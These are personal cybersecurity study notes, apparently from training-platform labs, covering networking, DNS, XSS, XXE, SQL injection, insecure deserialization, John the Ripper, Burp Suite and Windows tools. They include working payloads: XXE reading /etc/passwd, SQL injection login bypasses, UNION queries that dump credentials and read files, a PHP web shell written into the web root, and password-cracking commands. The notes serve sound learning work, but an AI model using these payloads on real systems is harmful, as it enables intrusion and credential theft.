            * These are <span style="text-decoration:underline;">great when receiving large amounts of traffic from a set amount of hosts</span> (Like a DDoS attack)
    * Firewalls operate at Layers 3 and 4 of the OSI model
* VPN Basics
    * **Virtual Private Network**
    * <span style="text-decoration:underline;">Allows devices on separate networks to communicate securely by creating a dedicated path between each other over the internet (TUNNEL)</span>
    * Benefits
        * Offers <span style="text-decoration:underline;">privacy</span>
        * Offers <span style="text-decoration:underline;">anonymity</span>
        * Allows networks in <span style="text-decoration:underline;">different geographical locations</span> to be connected
    * VPN technologies
        * **PPP**
            * Is used by PPTP (Below) to allow for authentication and provide encryption of data
            * Works by using a <span style="text-decoration:underline;">private key and public certificate</span> (similar to SSH)
            * Private key and certificate must match for you to connect
            * <span style="text-decoration:underline;">Not capable of leaving a network by itself (non-routable)</span>
        * **PPTP**
            * **Point-to-point tunneling Protocol**
            * Allows data from <span style="text-decoration:underline;">PPP to travel and leave a network</span>
            * <span style="text-decoration:underline;">Very easy to set up</span> and is supported by most devices
            * <span style="text-decoration:underline;">Weakly encrypted compared to alternatives</span>
        * **IPSec**
            * **Internet Protocol Security**
            * <span style="text-decoration:underline;">Encrypts data using the existing IP framework</span>
            * Difficult to set up in comparison
            * If successful, has<span style="text-decoration:underline;"> strong encryption </span>and also supported on many devices
* Load Balancers
    * When a website’s traffic starts getting quite large or is running an application that needs to have high availability, one web server might no longer do the job
    * Provides two main features
        * <span style="text-decoration:underline;">Ensuring high traffic websites can handle the load </span>
        * <span style="text-decoration:underline;">providing a failover if a server becomes unresponsive</span>
    * Load balancer will receive you request first then forward it to one of the multiple servers behind it
    * Uses different algorithms to help it decide which server is best to  deal with the request
        * <span style="text-decoration:underline;">Round-robin</span>
            * Sends it to each server in turn
        * <span style="text-decoration:underline;">Weighted</span>
            * Checks how many requests a server is currently dealing with and sends it to the least busy server
    * Health check
        * Load balancers performing periodic checks with each server to ensure they are running correctly
        * If a server doesn’t respond appropriately or<span style="text-decoration:underline;"> doesn’t respond, the load balancer will stop sending traffic until it reponds again</span>
* CDN (Content Delivery Networks)
    * Allows you to <span style="text-decoration:underline;">host static files from your website</span>, such as Javascript, CSS, images, videos, and host tehm across thousands of servers all over the world
    * When a user requests one of the hosted files, the <span style="text-decoration:underline;">CDN works out where the nearest server is physically located</span> and sends therequest there instead of potentially the other side of the world.
* Databases
    * Webservers can communicate with databases to <span style="text-decoration:underline;">store and recall data</span> from them
    * Databases can range from just a simple plain text file up to complex clusters of multiple servers providing speed and resilience
* WAF(Web Application Firewall)
    * **Sits between your web request and the web server**
    * Primary purpose is to <span style="text-decoration:underline;">protect the web server from hacking or denial of service </span>attacks
    * Analysis the web requests for common attack techniques,<span style="text-decoration:underline;"> whether the request is from a real browser rather than a bot</span>
    * Checks if an <span style="text-decoration:underline;">excessive amount of web request is being sent by utilizing</span> something called <span style="text-decoration:underline;">rate limiting</span>
        * Will only allow a certain amount of requests from an IP per second
    * If deemed a potential attack, it will be dropped and never sent to the web server
* How web servers work?
    * What is a web server
        * **A software that listens for incoming connections and then utiliises the HTTP protocol to deliver web content to ints clients**
        * <span style="text-decoration:underline;">Common web server software</span>
            * Apache
            * Nginx
            * IIS
            * NodeJS
        * Delivers files from its root directory defined in the software settings
    * Virtual hosts
        * Web servers can<span style="text-decoration:underline;"> host multiple websites</span> with different domain names
        * Web server software checks the hostname being requested from the HTTP headers and matches that against its virtual hosts
            * Virtual hosts are just <span style="text-decoration:underline;">text-based config files</span>
        * If it finds a match, <span style="text-decoration:underline;">the correct website will be provided</span>
            * If <span style="text-decoration:underline;">no matches found, the default website </span>will be provided
        * Virtual hosts can have their root directory mapped to different locations on the hard drive
    * Static vs dynamic content
        * Static content
            * Content that never changes
                * Pictures, JS, CSS, etc.
                * Can also include HTML that never changes
            * Directly served from the webserver with no changes made to them
        * Dynamic content
            * Content that could change with different requests
                * Example - Blog homepage updating with new post
            * Depending on what you search, different results will be displayed
    * Scripting and Backend languages
        * Languages
            * PHP, python, ruby, NodeJS, Perl, Many more
        * Can interact with databases, call external services, process data from the user, and much more


# DNS In Detail



* What is DNS?
    * Domain Name System
    * Every computer on the internet has its own unique address to communicate with it
* Domain Hierarchy
    * TLD (Top Level Domain)
        * Most righthand part of a domain name
        * Example
            * Tryhackme.com = .com
        * 2 types of TLD
            * gTLD (Generic Top Level)
                * Tell the user th domain name’s purpose
                    * .com - Commercial
                    * .edu - Education
                    * .org - Organization
                    * .gov - Government
            * ccTLD (Country Code Top Level Domain)
                * Used for geographical purposes
                    * .ca - Canada
                    * .co.uk - United kingdom
        * Second Level Domain
            * Example
                * Tryhackme.com = tryhackme
            * Limited to 63 characters + the TLD
            * Can only use a-z 0-9 and hyphens
                * Cannot start or end with hyphens or have consecutive hyphens
        * Subdomain
            * Left hand side of the domain
            * Example
                * Admin.tryhackme.com = admin
            * Subdomain name has the same creation restrictions as Second-level domains
            * You can use multiple subdomains split with periods to create longer names
                * Jupiter.servers.tryhackme.com
            * Length must be kept to 253 characters or less
* Record Types
    * Multiple types of DNS record exist
        * A record
            * Resolve to IPv4 addresses like 104.26.10.229
        * AAAA record
            * Resolve to IPv6 addresses like 2606:4700:20::681a:be5
        * CNAME record
            * Resolve to another domain name
            * Example
                * Store.tryhackme.com returns shops.shopify.com
            * Another DNS request would then be made to shops.shopify.com wot work out the IP address
        * MX record
            * Resovle to the address of the servers that handle the email for the domain you are querying
            * These records come with a priority flag
            * Would be used to advice where to send email
            * Example
                * Tryhackme.com = alt1.aspmx.l.google.com
        * TXT Record
            * Free text fields where any text-based data can be stored
            * Common uses
                * List servers that have the authority to send an email on behalf of the domain
                * Verify ownership of the domain name when signing up for third party services
    * What happens when you make a DNS request?
        * 1. Your computer checks its local cache to see if you’ve previously looked up the address recently. If not, a request to your Recursive DNS server will be made
        * 2. Recursive DNS Server is usually provided by your internet service provider but you can choose your own. This server also has a local cache of recently looked-up domain names
            * If found locally, it’s sent back to your computer and the request ends here
            * If it cannot be found locally, the request moves to the internet’s root DNS servers
        * 3. Root servers act as the DNS backbone of the internet
            * Their job is to redirect you to the correct Top Level Domain Server, depending on your request
            * If you request tryhackme.com, the root server will recognize the TLD of .com and refer you to the correct TLD server that deals with .com addresses
        * 4. TLD server holds records for where to find the authoritative server to answer the DNS request
            * Authoritative server is often also known as the nameserver for the domain
                * Example
                    * Tryhackme.com is kip.ns.cloudflare.com
                    * Often has backups
        * 5. An authoritative DNS server is the server that is responsible for storing the DNS records for a particular domain name and where any updates to your domain name DNS records would be made
            * Depending on the record type, the DNS record is then sent back tto the recursive DNS server, where a local copy will be cached for future requests and then related back to the original client that made the request
            * DNS records all come wit ha TTL (Time to live) value
                * Represented in seconds that the response should be saved for locally until you have to look it up again


# Cross-site scripting (XSS)



* Stored XSS - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitized (remove the "bad parts" of a user's input) when inserted into the database.
* Reflected XSS - the malicious payload is part of the victim's request to the website. The website includes this payload in response back to the user. To summarize, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
* DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.


## XXE Injection



* Read files from XML
    * &lt;?xml version="1.0" encoding="UTF-8"?>

        &lt;!DOCTYPE ID [ &lt;!ENTITY read SYSTEM "file:///etc/passwd"> ]>


        &lt;data>&lt;ID>&read;&lt;/ID>&lt;/data>



## XSS Payloads

Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payload types used:



* Popup's (&lt;script>alert(“Hello World”)&lt;/script>) - Creates a Hello World message popup on a user's browser.
* Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
* XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
* Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).
* XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.
* Show the Client Hostname or IP
    * &lt;script>alert(window.location.hostname)&lt;/script>
* Inserting html into comment box
    * Used &lt;h1>&lt;/h1>
* Making alert popup box appear on page with document cookies
    * (&lt;script>alert(document.cookies)&lt;/script>)
* Changing the header of the website with JS injection
    * &lt;script>document.querySelector('#thm-title').textContent = 'I am a hacker'&lt;/script>


# SQL Injection



* As HTTP(S) requests arrive from the user, the web application’s back-end will issue queries to the database to build the response
* Malicious users can trick the query into being used for something other than what was intended
* SQL injection refers to attacks against <span style="text-decoration:underline;">relational databases</span> such as <span style="text-decoration:underline;">MySQL</span>
    * Injections against non-relational databases are called _<span style="text-decoration:underline;">NoSQL Injection</span>_
* Attacker has to inject code outside the expected user input limits so its not executed as simple user input
    * Most basic case is by injecting single quotes (‘) or double quotes (“) to escape the limits of user input
* 

<p id="gdcalert16" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image16.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert17">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image16.png "image_tooltip")

* In-Band
    * The output of both the intended and the new query may be printed directly on the front end and we can directly read it
    * Has 2 types. Union Based and Error based
        * Union Based
            * We may have to specify the exact location which we can read so the query will direct the output to be printed there
        * Error based
            * Used when we can get the PHP or SQL error in the front-end so we may intentionally cause an SQL error that returns the output of our query
* Blind SQL Injection
    * We may not get the output printed, so we may utilize SQL logic to retrieve the output character by character
    * Boolean Based
        * We can use SQL conditional statements to control whether the page returns any output at all (Original query response), if our conditional statement returns true
    * Time-Based
        * We use SQL conditional statements that delay the page response if the conditional statement returns true using the <span style="text-decoration:underline;">Sleep() function</span>
* Out-of-band SQL Injection
    * Do not have direct access to the output whatsoever, so we may have to direct the output to a remote location (IE DNS Record), then attempt to retrieve it from there
* SQLi Discovery
    * Test whether or not the form is vulnerable to SQL injection
    * 

<p id="gdcalert17" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image17.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert18">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image17.png "image_tooltip")

* OR Injection
    * We need the query to always return true to bypass the authentication, to do this, we can abuse the OR operator
    * If we input
        * admin' or '1'='1
            * It always returns true
            * Executed query would be SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
    * What if we don't know any valid usernames?
        * SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something' or ‘1’=’1’;
        * WE input `something' or '1'='1`
        * Login as tom with no password
            * tom' or '1'='1
        * Login as user with id =5 
            * **' or id = 5 )#** 
* UNION clause injection
    * Combines both SELECT statements into one
    * Unions can only operate on SELECT statements with an equal number of columns
    * For un-even columns
        * We can use any string as our junk data
            * Can use SELECT “junk” from passwords;
            * SELECT 1 from passwords
    * Union injection
        * We need to detect number of columns
            * Using ORDER BY
                * ‘ order by 1–(Space)
                * Increase number until you get error
            * Using UNION
                * ' UNION select 1,2,3–(space)
                * Add numbers unless error
        * Location of injection	
            * Very common that not every column will be displayed back to the user
            * You have to change where to palace the injection 
            * To detect
                * ’ UNION select 1,@@version,3,4–(space)
* Database enumeration
    * MySQL fingerprinting
        * 

<p id="gdcalert18" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image18.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert19">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image18.png "image_tooltip")

    * INFORMATION_SCHEMA database
        * SELECT * FROM &lt;databasename>.users
        * SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA>SCHEMATA;
            * cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
    * Dump data from dev database
        * Contains all info of all tables in the database
            * cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
        * Finds all column names to query a table for 
            * cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
        * Form union query of username and password columns from credentials table in dev database 
            * cn' UNION select 1, username, password, 4 from dev.credentials-- -
* Reading files
    * Need to know who we are
        * SELECT USER()
        * Union payload 
            * cn' UNION SELECT 1, user(), 3, 4-- -
    * See if we have super admin privileges
        * SELECT super_priv FROM mysql.user
        * Union payload
            * cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
    * If yes
        * See other privileges 
            * cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
        * Root privs 
            * cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
    * LOAD_FILE
        * SELECT LOAD_FILE('/etc/passwd');
        * Union payload
            * cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
        * Ex
            * cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
* Writing files
    * 3 things required for writing files
        * User with File privilege enabled
        * MySQL global secure_file_priv variable is NOT enabled
        * Write access to the location we want to write to on the back-end server
    * Checking secure_file_priv
        * SQL
            * SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
        * Union Payload
            * cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
    * SELECT INTO OUTFILE
        * SELECT * from users INTO OUTFILE '/tmp/credentials';
    * Writing files through sql injections
        * Sql
            * select 'file written successfully!' into outfile '/var/www/html/proof.txt'
        * Union payload
            * cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
    * Writing a web shell
        * &lt;?php system($_REQUEST[0]); ?>
        * Union
            * cn' union select "",'&lt;?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
            * Then navigate to /shell.php?0=id
                * LINUX COMMANDS 
                    * 0= &lt;LINUX COMMANDS>
* Database management systems (DBMS)
    * Types
        * File-based
        * Relational DBMS
            * Uses a schema or template to dictate the data structure stored in the database
            * Tables (Entities) in a relational database are associated with keys that provide a quick database summary or access to the specific row or column when specific data needs to be reviewed
            * Tables are connected through keys
        * NoSQL (Non-relational database)
            * Does not use tables, rows, and columns or prime keys, relationships, or schemas
            * NoSQL databases are very scalable and flexible
            * Most common storage models
                * Key-value
                * 

<p id="gdcalert19" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image19.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert20">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image19.png "image_tooltip")

                * Document-based
                * Wide-column
                * Graph
        * Graph-based
        * Key/ Value stores
    * Architecture
        * Tier I
            * Client-side applications such as websites or GUI programs
            * High-level interactions such as user login or commenting
            * Data from these interactions are passed to **<span style="text-decoration:underline;">Tier II</span>** through API calls or other requests
        * Tier II
            * Middleware
            * Interprets these events and puts them in a form required by the DBMS
            * The application layer uses specific libraries and drivers based on the type of DBMS to interact with them
            * DBMS receives queries from the second tier and performs the requested operations
                * Could include Insertion, retrieval, deletion, or updating of data
* MySQL (mysql command)
    * Mysql -u &lt;username> -p(Prompts PW instead of having it in cleartext)
    * Can specify host with -h and port with -P
    * Commands
        * CREATE DATABASE &lt;name>;
        * SHOW DATABASES;
        * USE &lt;database name>
        * SHOW TABLES;
        * DESCRIBE &lt;table name>;
            * Lists table structure with fields and data type
        * INSERT COMMANDS
            * INSERT INTO &lt;tablename> VALUES (Values, values, values)
            * INSERT INTO logins(Username, password) VALUES (“administrator”, “admin_pass”);
                * Insert into specific columns in login table with values
            * INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
                * Insert more than one record
        * SELECT COMMANDS
            * SELECT * FROM &lt;TableName>
                * Views entire table, (*) is all wildcard
            * SELECT &lt;column1>, &lt;column2> FROM &lt;table_name>;
                * Only select data present in column 1 and 2 only
        * DROP Statement
            * Removes tables and databases
            * DROP TABLE logins;
        * ALTER statement
            * Change name of table and any fields or delete/add columns
            * ALTER TABLE logins ADD newColumn INT;
                * Adds a new column to login table
            * ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
                * Rename a column
            * ALTER TABLE logins MODIFY oldColumn DATE;
                * Change column data type
            * ALTER TABLE logins DROP oldColumn;
                * Remove a column
        * UPDATE Statement
            * Used to change specific records
            * UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE &lt;condition>;
        * ORDER BY
            * SELECT * FROM logins ORDER BY password &lt;asc> or &lt;desc>;
            * SELECT * FROM logins ORDER BY password DESC, id ASC;
                * Sort by multiple column to have a secondary sort for duplicate values in one column
        * LIMIT
            * Limit results to number of results we want
            * SELECT * FROM logins LIMIT 2;
                * Only lists the first 2
            * SELECT * FROM logins LIMIT 1, 2;
                * Limit results with an **offset**, specify the offset before the LIMIT count
        * WHERE clause
            * SELECT * FROM table_name WHERE &lt;condition>;
                * Return records which satisfy the given condition
            * SELECT * FROM logins WHERE id > 1;
            * SELECT * FROM logins where username = 'admin';
        * LIKE Clause
            * Selecting records by matching a certain pattern
            * SELECT * FROM logins WHERE username LIKE 'admin%';
                * Lists both “admin” and “administrator”
            * SELECT * FROM logins WHERE username like '___';
                * Each _ is one character. EX > Only records with 3 chars
        * AND Operator
            * condition1 AND condition2
                * Returns true or false
        * OR Opeartor
            * SELECT 1 = 1 OR 'test' = 'abc';
        * NOT Operator
            * SELECT NOT 1 = 1;
        * Symbol Operators
            * AND = && 
            * OR = || 
            * NOT = !


# Insecure Deserialization



* Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.
* Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.
* The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organizations will recover just fine, others, however, will not.
* In summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:
    * - E-Commerce Sites
    * - Forums
    * - API's
    * - Application Runtimes (Tomcat, Jenkins, Jboss, etc)
* Objects
    * A prominent element of object-oriented programming (OOP), objects are made up of two things:
        * State
        * Behavior
* Deserialization
    * Analogy
        * A Tourist approaches you in the street asking for directions. They're looking for a local landmark and got lost. Unfortunately, English isn't their strong point and nor do you speak their dialect either. What do you do? You draw a map of the route to the landmark because pictures cross language barriers, they were able to find the landmark. Nice! You've just serialized some information, where the tourist then deserialized it to find the landmark.
    * Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialized back into "password123" so it can be stored.
* Cookies (Deserialization)
    * Cookies - Tiny pieces of data created by a website and stored on the user’s computer
    * Cookies can store login information
    * Whilst plaintext credentials is a vulnerability in itself, it is not insecure deserialization as we have not sent any serialized data to be executed!
    * Some cookies such as sessions id’s will clear when the browser is closed, others can last considerably longer
    * 

<p id="gdcalert20" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image20.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert21">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image20.png "image_tooltip")

    * Creating cookies
        * Can be set in multiple languages
            * JS, PHP, Python, etc.
* Cookies Practical (Deserialization)
    * Can change the values of the cookies to trick web app
        * Ex. Changing “usertype” to “admin”
* Code Execution
    * Forms can be vulnerable


# Components with known vulnerabilities



* Exploiting
    * Can use exploit-db to find specific version exploit
* Lab
    * How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer) 
        * Used [https://www.exploit-db.com/exploits/47887](https://www.exploit-db.com/exploits/47887)
        * Used python3 &lt;pythonfile> &lt;url>
            * Gained reverse shell
        * wc -c /etc/passwd
            * 1611 /etc/passwd


# Insufficient Logging and Monitoring



* The information stored in logs should include:
    * HTTP status codes
    * Time Stamps
    * Usernames
    * API endpoints/page locations
    * IP addresses
* These logs do have some sensitive information on them so it's important to ensure that logs are stored securely and multiple copies of these logs are stored at different locations.
* The ideal case is having monitoring in place to detect any suspicious activity
    * multiple unauthorized attempts for a particular action (usually authentication attempts or access to unauthorized resources e.g. admin pages)
    * requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
    * use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.
    * common payloads: in web applications, it's common for attackers to use Cross Site Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorized/malicious testing on applications.


# John the Ripper



* john --format=[format] --wordlist=[path to wordlist] [path to file]
* Cracking windows hashes
    * Authentication hashes are the hashed versions of passwords that are stored by operating systems
    * To get the hashes, you must already be a privileged user
    * NTHash / NTLM
        * NTHash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as "NTLM"
        * You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: NTDS.dit. 
        * You may not have to crack the hash to continue privilege escalation- as you can often conduct a "pass the hash" attack instead, but sometimes hash cracking is a viable option if there is a weak password policy.
* Cracking the passwords from /etc/shadow
    * Location of password hashes are stored on linux
        * Usually only root users can access the file
    * Unshadowing
        * unshadow [path to passwd] [path to shadow]
        * **Example Usage:**
            * unshadow local_passwd local_shadow > unshadowed.txt
        * **Note on the files**
            * When using unshadow, you can either use the entire /etc/passwd and /etc/shadow file- if you have them available, or you can use the relevant line from each, for example:
        * **FILE 1 - local_passwd**
            * Contains the /etc/passwd line for the root user:
            * Root:x:0:0::/root:/bin/bash
        * **FILE 2 - local_shadow**
            * Contains the /etc/shadow line for the root user:
            * root:$6$2nwjN454g.dv4HN/$m9Z/r2xVfweYVkrr.v5Ft8Ws3/YYksfNwq96UL1FX0OJjY1L6l.DS3KEVsZ9rOVLB/ldTeEL/OIhJZ4GMFMGA0:18576::::::
* Single crack mode
    * **Word Mangling**
        * The best way to show what Single Crack mode is,  and what word mangling is, is to actually go through an example:
            * If we take the username: Markus
                * Some possible passwords could be:
                * Markus1, Markus2, Markus3 (etc.)
                * MArkus, MARkus, MARKus (etc.)
                * Markus!, Markus$, Markus* (etc.)
        * **GECOS**
            * John's implementation of word mangling also features compatibility with the Gecos fields of the UNIX operating system, and other UNIX-like operating systems such as Linux. So what are Gecos? Remember in the last task where we were looking at the entries of both /etc/shadow and /etc/passwd? Well if you look closely You can see that each field is separated by a colon ":". Each one of the fields that these records are split into are called Gecos fields. John can take information stored in those records, such as full name and home directory name to add into the wordlist it generates when cracking /etc/shadow hashes with single crack mode.
    * john --single --format=[format] [path to file]
        * Ex: john --single --format=raw-sha256 hashes.txt
    * Need to change the file format that you’re feed ing john for it to be in the user:hash format
* Custom Rules
    * Common Custom Rules
        * Many organizations will require a certain level of password complexity to try and combat dictionary attacks, meaning that if you create an account somewhere, go to create a password and enter:
    * You may receive a prompt telling you that passwords have to contain at least one of the following:
        * Capital letter
        * Number
        * Symbol
        * Many users will use something like 
            * PoloPassword1!
    * How to create custom rules in John
        * [List.Rules:THMRules] - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.
        * We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
            * Az - Takes the word and appends it with the characters you define
            * A0 - Takes the word and prepends it with the characters you define
            * c - Capitalises the character positionally
            * We do this by adding character sets in square brackets [ ] in the order they should be used. 
            * These directly follow the modifier patterns inside of double quotes " "
            * [0-9] - Will include numbers 0-9
            * [0] - Will include only the number 0
            * [A-z] - Will include both upper and lowercase
            * [A-Z] - Will include only uppercase letters
            * [a-z] - Will include only lowercase letters
            * [a] - Will include only a
            * [!£$%@] - Will include the symbols !£$%@
        * Generate new rule for example password
            * [List.Rules:PoloPassword]
            * cAz"[0-9] [!£$%@]"
                * In order to:
                * Capitalize the first  letter - c
                * Append to the end of the word - Az
                * A number in the range 0-9 - [0-9]
                * Followed by a symbol that is one of [!£$%@]
    * Using custom rules
        * john --wordlist=[path to wordlist] --rule=&lt;customRule> [path to file]
* Cracking a password protected zip file
    * Zip2john
        * zip2john [options] [zip file] > [output file]
            * [options] - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary
            * [zip file] - The path to the zip file you wish to get the hash of
            * > - This is the output director, we're using this to send the output from this file to the...
            * [output file] - This is the file that will store the output from 
        * YOU HAVE TO ZIP2JOHN TO A FILE FIRST, THEN CRACK
        * Ex: zip2john zipfile.zip > zip_hash.txt
        * Ex: john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
* Cracking Password Protected RAR Archive
    * Almost identical to zip2john
    * Convert .rar to hash that john can understand
    * Syntax: rar2john [rar file] > [output file]
        * rar2john - Invokes the rar2john tool
        * [rar file] - The path to the rar file you wish to get the hash of
        * > - This is the output director, we're using this to send the output from this file to the...
        * [output file] - This is the file that will store the output from
        * Example Usage
            * rar2john rarfile.rar > rar_hash.txt
    * Cracking
        * john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt
* Cracking SSH Keys With John
    * Use john to crack the SSH private key password of id_rsa files
    * SSH2john
        * ssh2john [id_rsa private key file] > [output file]
            * ssh2john - Invokes the ssh2john tool
            * [id_rsa private key file] - The path to the id_rsa file you wish to get the hash of
            * > - This is the output director, we're using this to send the output from this file to the...
            * [output file] - This is the file that will store the output from
                * Example Usage
                * ssh2john id_rsa > id_rsa_hash.txt
    * Cracking
        * Ex: john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt


# Burp Suite



* Intruder
    * Built in fuzzing tool
    * Allows us to send many requests with slightly altered values automatically
    * Subtabs
        * **Positions** 
            * allows us to select an Attack Type as well as configure where in the request template we wish to insert our payloads.
            * Add §
                * Lets us define new positions by highlighting them in the editor and clicking the button
            * Clear §
                * Removes all defined positions, leaving us with a blank canvas to define our own
            * Auto §
                * Attempts to select the most likely positions automatically; this is useful if we cleared the default positions and want them back
            * Attack Types
                * Sniper
                    * Provide one set of payloads
                        * Could be a single file containing a wordlist or a range of numbers
                        * “Payload set”
                * Battering ram
                    * Takes one set of payloads
                    * It puts the SAME payloads in EVERY position rather than in each position in turn
                    * Ex: username=burp&password=burp
                    * username=suite&password=suite
                    * username=intruder&password=intruder
                * Pitchfork
                    * Uses one payload set per position (up to 20 maximum) and iterates through all at once
                    * Our first wordlist will be usernames. It contains three entries: joel, harriet, alex.
                    * Let's say that Joel, Harriet, and Alex have had their passwords leaked: we know that Joel's password is J03l, Harriet's password is Emma1815, and Alex's password is Sk1ll
                    * username=joel&password=J03l
                    * username=harriet&password=Emma1815
                    * username=alex&password=Sk1ll
                * Cluster bomb
                    * Allows us to choose multiple payload sets: one per position (Maximum of 20)
                    * Cluster bomb iterates through each payload set individually, making sure that every possible combination of payloads is tested
        * **Payloads** 
            * allows us to select values to insert into each of the positions we defined in the previous sub-tab. For example, we may choose to load items in from a wordlist to serve as payloads. How these get inserted into the template depends on the attack type we chose in the Positions tab. There are many payload types to choose from (anything from a simple wordlist to regexes based on responses from the server). The Payloads sub-tab also allows us to alter Intruder's behavior with regards to payloads; for example, we can define pre-processing rules to apply to each payload (e.g. add a prefix or suffix, match and replace, or skip if the payload matches a defined regex).
            * **Payload sets** allows us to choose which position we want to configure a set for as well as what type of payload we would like to use
            * **Payload Options **differ depending on the payload type we select for the current payload set
            * **Payload processing **allows us to define rules to be applied to each payload in the set before being sent to the target
            * **Payload Encoding** allows us to override the default URL encoding options that are applied automatically to allow for the safe transmission of our payload 
                * Sometimes it can be beneficial to NOT URL encode these standard “unsafe” characters, which is where this comes in.
        * **Resource Pool** 
            * is not particularly useful to us in Burp Community. It allows us to divide our resources between tasks. Burp Pro would allow us to run various types of automated tasks in the background, which is where we may wish to manually allocate our available memory and processing power between these automated tasks and Intruder. Without access to these automated tasks, there is little point in using this, so we won't devote much time to it.
        * As with most of the other Burp tools, Intruder allows us to configure attack behavior in the **Options_ _**sub-tab. The settings here apply primarily to how Burp handles results and how Burp handles the attack itself. For example, we can choose to flag requests that contain specific pieces of text or define how Burp responds to redirect (3xx) responses.
    * Example: We can fuzz for endpoints
        * Ex: [http://10.10.203.155/WORD_GOES_HERE](http://10.10.203.155/WORD_GOES_HERE)


# Windows Fundamentals



* Remote desktop protocol
    * Linux Command
        * <span style="text-decoration:underline;">xfreerdp /v:10.10.153.53 /u:administrator /p:letmein123!</span>
* UAC 
    * User account control
        * Permissions
* User and group control
    * Lusrmgr.msc
* Msconfig
    * Tools
        * Perfmon
        * Compmgmt.msc - computer management
            * Shared folders
            * Task scheduler
            * Even viewer
            * Local user and groups
        * Msinfo32.msc
            * System information
        * Ipconfig.exe
            * Ipconfig /all
            * Netstat
                * Display protocol statistics and current TCP/IP connections
            * Netuser
        * Regedt32.exe
            * Registry editor
        * Wf.msc
            * Windows firewall
* Bitlocker
